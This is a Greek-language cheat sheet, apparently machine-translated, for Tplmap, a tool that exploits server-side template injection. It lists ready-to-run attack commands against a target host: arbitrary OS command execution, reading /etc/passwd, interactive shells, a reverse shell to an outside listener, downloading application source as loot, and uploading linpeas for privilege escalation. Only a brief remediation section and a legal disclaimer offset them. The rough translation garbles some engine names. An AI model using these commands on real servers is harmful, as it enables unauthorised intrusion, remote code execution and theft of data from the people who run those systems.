<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎭 Tplmap - Πλήρες φύλλο εξαπάτησης

[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
```
  ████████╗██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗ 
  ╚══██╔══╝██╔══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
     ██║   ██████╔╝██║     ██╔████╔██║███████║██████╔╝
     ██║   ██╔═══╝ ██║     ██║╚██╔╝██║██╔══██║██╔═══╝ 
     ██║   ██║     ███████╗██║ ╚═╝ ██║██║  ██║██║     
     ╚═╝   ╚═╝     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
       Server-Side Template Injection (SSTI) Automated Exploiter
```
<p align="center">
  <img src="https://img.shields.io/badge/Tplmap-SSTI_Exploitation-blue?style=for-the-badge" alt="Tplmap">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-orange?style=for-the-badge" alt="Web Security & API">
  <img src="https://img.shields.io/badge/Engines-Jinja2_Twig_Mako_Freemarker-green?style=for-the-badge" alt="Template Engines">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="License GPLv2">
</p>

<p align="center">
  <b>🌐 Εργαλείο αυτοματοποιημένης εκμετάλλευσης που έχει σχεδιαστεί για να ανιχνεύει και να εκμεταλλεύεται τις ευπάθειες του Server-Side Template Injection (SSTI) για την επίτευξη απομακρυσμένης εκτέλεσης κώδικα</b>
</p>

---

## 📋 Πίνακας περιεχομένων

- [Επισκόπηση και ευπάθεια SSTI](#-επισκόπηση--the-ssti-vulnerability)
- [Υποστηριζόμενες μηχανές προτύπων] (#-supported-template-engines)
- [Εγκατάσταση] (#-εγκατάσταση)
- [Basic Vulnerability Detection](#-basic-vulnerability-detection)
- [Targeting Specific Injection Points (δείκτης `*`)] (#-targeting-specific-injection-points--marker)
- [Εκτέλεση απομακρυσμένης εντολής (`--os-cmd`)](#-απομακρυσμένη εντολή-εκτέλεση---os-cmd)
- [Interactive Shells & Reverse Connections](#-interactive-shells--reverse-connections)
- [Μεταφόρτωση και λήψη αρχείου](#-αρχείο-μεταφόρτωση--λήψη)
- [Δοκιμή δεδομένων και κεφαλίδων POST](#-testing-post-data--headers)
- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
- [Defensive Considerations & Remediation](#-defensive-considerations--remediation)
- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)

---

## 🎯 Επισκόπηση & Η ευπάθεια SSTI

**Η Έγχυση προτύπου από την πλευρά του διακομιστή (SSTI)** πραγματοποιείται όταν μια εφαρμογή ενσωματώνει μη επικυρωμένα στοιχεία χρήστη απευθείας σε ένα πρότυπο από την πλευρά του διακομιστή αντί να τα μεταβιβάζει ως δεδομένα προς απόδοση. Επειδή οι σύγχρονες μηχανές προτύπων επιτρέπουν σύνταξη όπως το `{{7*7}}` ή το `${7*7}`, οι εισβολείς μπορούν να ξεφύγουν από το sandbox και να αποκτήσουν πρόσβαση στο υποκείμενο περιβάλλον χρόνου εκτέλεσης (Python, Java, PHP, Ruby, Node.js).

Γραμμένο από τους **Miroslav Stampar** και **Emilio Pinna**, το **Tplmap** λειτουργεί ως "SQLMap για μηχανές προτύπων". Αποτυπώνει αυτόματα δακτυλικά αποτυπώματα στον ενεργό κινητήρα προτύπου, ξεφεύγει από τα πλαίσια αξιολόγησης προτύπων και κλιμακώνει την εκτέλεση κώδικα σε πλήρη πρόσβαση σε επίπεδο κελύφους λειτουργικού συστήματος.

---

## 🧩 Υποστηριζόμενες μηχανές προτύπων

| Γλώσσα | Υποστηριζόμενες μηχανές προτύπων |
|----------|----------------------------|
| **Python** | Jinja2, Mako, Tornado, Nunjucks |
| **PHP** | Κλαδί, Έξυπνο |
| ** Java ** | Freemarker, Velocity |
| **Ρουμπίνι** | ERB, Slim |
| **Node.js** | Jade, Pug, Dust.js |

---

## 📥 Εγκατάσταση

Το Tplmap είναι χτισμένο σε Python:
```bash
# Clone GitHub repository
git clone https://github.com/epinna/tplmap.git
cd tplmap

# Install dependencies
pip install -r requirements.txt

# Verify installation
python tplmap.py --help
```
---

## 🚀 Βασικός εντοπισμός ευπάθειας
```bash
# Scan a GET parameter for SSTI
python tplmap.py -u "http://target.local/page?name=John"

# Mark explicit injection point using an asterisk (*)
python tplmap.py -u "http://target.local/profile?id=1&bio=*"
```
---

## 💻 Εκτέλεση απομακρυσμένης εντολής (`--os-cmd`)

Μόλις το Tplmap εντοπίσει τον κινητήρα (π.χ. Jinja2), εκτελέστε αυθαίρετες εντολές φλοιού απευθείας:
```bash
# Execute whoami on target
python tplmap.py -u "http://target.local/page?name=*" --os-cmd "whoami; id"

# Read sensitive configuration files
python tplmap.py -u "http://target.local/page?name=*" --os-cmd "cat /etc/passwd"
```
---

## 💀 Διαδραστικά κελύφη & αντίστροφες συνδέσεις
```bash
# Spawn an interactive pseudo-terminal within Tplmap
python tplmap.py -u "http://target.local/page?name=*" --os-shell

# Drop a full reverse TCP connection to a Netcat listener
python tplmap.py -u "http://target.local/page?name=*" \
  --reverse-shell 10.10.14.5 4444
```
---

## 📁 Μεταφόρτωση και λήψη αρχείου

Εξαγωγή πηγαίου κώδικα ή μεταφόρτωση εργαλείων επιμονής:
```bash
# Download remote source code or configuration
python tplmap.py -u "http://target.local/page?name=*" \
  --download /var/www/html/app.py ./app_loot.py

# Upload a local payload to remote /tmp/ directory
python tplmap.py -u "http://target.local/page?name=*" \
  --upload ./linpeas.sh /tmp/linpeas.sh
```
---

## 🌐 Δοκιμή δεδομένων και κεφαλίδων POST
```bash
# Test POST body parameters
python tplmap.py -u "http://target.local/comment" -d "author=test&comment=*"

# Test HTTP Headers
python tplmap.py -u "http://target.local/dashboard" -H "User-Agent: *"

# Test behind authenticated session cookies
python tplmap.py -u "http://target.local/welcome?user=*" -c "session=xyz123"
```
---

## ⚡ Γρήγορος Πίνακας Αναφοράς

| Στόχος | Εντολή |
|-----------|---------|
| **Εντοπισμός SSTI στη διεύθυνση URL** | `python tplmap.py -u "<URL>?param=*"` |
| **Εκτέλεση απομακρυσμένης εντολής** | `python tplmap.py -u "<URL>" --os-cmd="<CMD>"` |
| **Διαδραστικό τερματικό** | `python tplmap.py -u "<URL>" --os-shell` |
| **Ρίξτε το αντίστροφο κέλυφος** | `python tplmap.py -u "<URL>" --reverse-shell <IP> <PORT>` |
| **Λήψη Απομακρυσμένου αρχείου** | `python tplmap.py -u "<URL>" --download <REMOTE> <LOCAL>` |
| **Μεταφόρτωση τοπικού αρχείου** | `python tplmap.py -u "<URL>" --upload <LOCAL> <REMOTE>` |
| **Δοκιμή POST Body** | `python tplmap.py -u "<URL>" -d "data=*"` |

---

## 🛡️ Αμυντικές Θεωρήσεις & Αποκατάσταση

1. **Context-Aware Escapeing:** Ποτέ μη συνενώνετε την ακατέργαστη είσοδο χρήστη σε συμβολοσειρές προτύπων. Χρησιμοποιήστε τον εγγενή μηχανισμό δέσμευσης μεταβλητής της μηχανής προτύπου (π.χ. σε Jinja2: `render_template('hello.html', name=user_input)` αντί `render_template_string(f"Hello {user_input}")`).
2. **Περιορισμοί Sandbox:** Επιβολή αυστηρού sandbox σε μηχανές όπου η δυναμική απόδοση είναι αναπόφευκτη, απαγορεύοντας την πρόσβαση σε `__class__`, `__mro__` ή αντικείμενα ανάκλασης.

---

## ⚠️ Νομική αποποίηση ευθύνης

> [!ΠΡΟΣΟΧΗ]
> Το Tplmap εκτελεί αυθαίρετο απομακρυσμένο κώδικα σε διακομιστές εφαρμογών προορισμού. Η δοκιμή ή η εκμετάλλευση διαδικτυακών εφαρμογών χωρίς προηγούμενη γραπτή εξουσιοδότηση είναι αυστηρά παράνομη.